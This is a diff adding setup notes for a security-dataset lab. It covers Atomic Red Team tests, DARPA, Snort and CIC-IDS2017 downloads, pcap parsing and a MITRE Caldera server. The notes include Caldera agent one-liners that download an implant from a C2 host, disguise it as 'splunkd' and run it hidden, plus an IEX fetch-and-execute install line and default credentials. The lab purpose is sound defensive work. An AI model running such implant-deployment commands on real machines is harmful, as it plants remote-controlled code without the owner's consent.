@@ -1,0 +1,201 @@
+
+1. Atomic (knowledge base) - 
+2. CIC (baseline labeled data) - network logs and labled with attack
+3. Snort (rule mapping) - alert rules
+4. DARPA (raw parsing) -  network and host audit logs
+5. Caldera (real attack validation) - real attcak logs using simulation
+6. GeoIP (enrichment - last)
+
+
+
+- install powershell
+powershell install- https://learn.microsoft.com/en-us/powershell/scripting/install/install-powershell-on-macos?view=powershell-7.6&viewFallbackFrom=powershell-6
+
+https://github.com/redcanaryco/invoke-atomicredteam/wiki/Installing-Invoke-AtomicRedTeam
+
+https://www.youtube.com/watch?v=v_FH2RGRk_s&list=PL92eUXSF717VeZ99Z3mO7MW09_mUWX5yr&index=3
+
+$ pwsh (luanch powershell)
+
+
+
+- install atomic red simulation for using powershell
+$ sudo installer -allowUntrusted -pkg ./Downloads/powershell-7.6.0-osx-x64.pkg -target /
+$ pwsh
+$ IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
+Install-AtomicRedTeam
+$ Install-AtomicRedTeam -getAtomics -Force
+
+- Test mitre tactics using powershell
+$ pwsh
+$ invoke-atomictest t1218 -ShowDetailsBrief -PathToAtomicsFolder  "/Users/gurpreetsingh/AtomicRedTeam/atomics/"
+$ Invoke-AtomicTest T1016 -ShowDetailsBrief -PathToAtomicsFolder "/Users/gurpreetsingh/AtomicRedTeam/atomics/"
+$ Invoke-AtomicTest T1016 -TestNumbers 8  -ShowDetailsBrief -PathToAtomicsFolder "/Users/gurpreetsingh/AtomicRedTeam/atomics/"
+$ Invoke-AtomicTest T1016 -TestNumbers 8  -ShowDetails -PathToAtomicsFolder "/Users/gurpreetsingh/AtomicRedTeam/atomics/"
+
+$ invoke-atomicTest T1059.001 -TestNumbers 14 -ShowDetails -PathToAtomicsFolder "/Users/gurpreetsingh/AtomicRedTeam/atomics/"
+
+$ invoke-atomicTest T1059.001 -verbose
+$ Get-AtomicTest T1059.004 | ConvertTo-Json -Depth 5 > atomic_test.json
+
+
+$Get-AtomicTechnique -Path "/Users/gurpreetsingh/AtomicRedTeam/atomics/" | ConvertTo-Json -Depth 5 > all_atomic.json
+
+
+
+### DARAPA datasets:
+---
+cd ~/Downloads/cybersec-dataset
+mkdir -p darpa/1999/week2
+
+cd darpa/1999/week2
+
+for day in monday tuesday wednesday thursday friday
+do
+  mkdir -p $day
+  cd $day
+
+  wget https://archive.ll.mit.edu/ideval/data/1999/training/week2/$day/outside.tcpdump.gz
+  wget https://archive.ll.mit.edu/ideval/data/1999/training/week2/$day/inside.tcpdump.gz
+  wget https://archive.ll.mit.edu/ideval/data/1999/training/week2/$day/pascal.bsm.gz
+
+  cd ..
+done
+---
+
+---
+cd ~/Downloads/cybersec-dataset
+mkdir -p darpa/1998/week1
+
+cd darpa/1998/week1
+
+for day in monday tuesday wednesday thursday friday
+do
+  wget https://archive.ll.mit.edu/ideval/data/1998/training/week1/$day.tar
+done
+---
+
+
+
+### snort rules datasets:
+
+wget https://www.snort.org/downloads/community/snort3-community-rules.tar.gz
+
+---
+mkdir -p snort/v3_0
+
+cd snort/v3_0
+
+for vr in 3
+do
+  wget https://www.snort.org/downloads/community/snort$vr-community-rules.tar.gz
+done
+
+tar -xvf *.tar.gz
+---
+
+### CIC-IDS2017 dataset (Note wget not working):
+
+wget https://cicresearch.ca/CICDataset/CIC-IDS-2017/download.php?file=CIC-IDS-2017%2FCSVs%2FMachineLearningCSV.zip
+wget https://cicresearch.ca/CICDataset/CIC-IDS-2017/download.php?file=CIC-IDS-2017%2FCSVs%2FGeneratedLabelledFlows.zip
+
+---
+mkdir -p cic/2017/ids
+
+cd cic/2017/ids
+
+for arg in MachineLearningCSV
+do
+  wget https://cicresearch.ca/CICDataset/CIC-IDS-2017/download.php?file=CIC-IDS-2017%2FCSVs%2FMachineLearningCSV.zip
+  wget https://cicresearch.ca/CICDataset/CIC-IDS-2017/download.php?file=CIC-IDS-2017%2FCSVs%2FGeneratedLabelledFlows.zip
+done
+---
+
+
+##### Extract darpa:
+
+---
+cd ~/Downloads/cybersec-dataset/darpa/1999/week2
+for day in monday tuesday wednesday thursday friday
+do
+  gunzip $day/inside.tcpdump.gz
+  gunzip $day/outside.tcpdump.gz
+  gunzip $day/pascal.bsm.gz
+  tcpdump -nn -r $day/inside.tcpdump > $day/inside.tcpdump.log
+  tcpdump -nn -r $day/outside.tcpdump > $day/outside.tcpdump.log
+  tcpdump -nn -r $day/pascal.bsm > $day/pascal.bsm.log
+done
+
+--- 
+
+cd 1998/week1
+for day in monday tuesday wednesday thursday friday
+do
+  gunzip $day/tcpdump.gz
+  gunzip $day/pascal.praudit.gz
+  tcpdump -nn -r $day/tcpdump > $day/tcpdump.log
+  mv $day/pascal.praudit $day/pascal.log
+done
+
+### Combine DARPA
+cd ~/Downloads/cybersec-dataset/darpa/1999/week1
+
+cat monday/inside.tcpdump.log tuesday/inside.tcpdump.log wednesday/inside.tcpdump.log thursday/inside.tcpdump.log friday/inside.tcpdump.log > inside.tcpdump.log
+
+cat monday/outside.tcpdump.log tuesday/outside.tcpdump.log wednesday/outside.tcpdump.log thursday/outside.tcpdump.log friday/outside.tcpdump.log > outside.tcpdump.log
+
+
+
+
+## caldera setup and dataset
+
+git clone https://github.com/mitre/caldera.git --recursive
+cd caldera
+python3 -m venv .calderavenv
+source .calderavenv/bin/activate
+pip3 install -r requirements.txt
+
+start server : python3 server.py --insecure --build
+
+kill server :
+lsof -i tcp:2222 | grep LISTEN |awk '{print $2}'|xargs kill -9
+lsof -i tcp:8022 | grep LISTEN |awk '{print $2}'|xargs kill -9
+lsof -i tcp:8888 | grep LISTEN |awk '{print $2}'|xargs kill -9
+
+UI : http://localhost:8888 
+
+UI user/pswd : red / admin
+
+start caldera agent : 
+server="http://192.168.1.33:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v
+
+$server="http://192.168.1.33:8888";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+
+
+
+
+here is approach, 1st combine files from weekly folder "~/Downloads/cybersec-dataset/darpa/1999/week1/" monday to friday of inside.tcpdump.log, outside.tcpdump.log, pascal.bsm.log and save in  "~/Downloads/cybersec-dataset/darpa/1999/week1/". so we have per week inside.tcpdump.log, outside.tcpdump.log, pascal.bsm.log.
+2nd we will start parsing logic of newly created files. 
+
+
+
+### argus tool
+
+brew install argus-clients
+brew install argus
+
+/usr/local/sbin/argus -r traffic.pcap -w traffic.argus
+
+ra -r traffic.argus
+
+ra -r traffic.argus -s saddr daddr proto sport dport dur pkts bytes > flows.csv
+
+ra -r 1.pcap.argus -c ',' -s saddr daddr proto sport dport pkts bytes state dur > 1.pcap.argus.csv
+
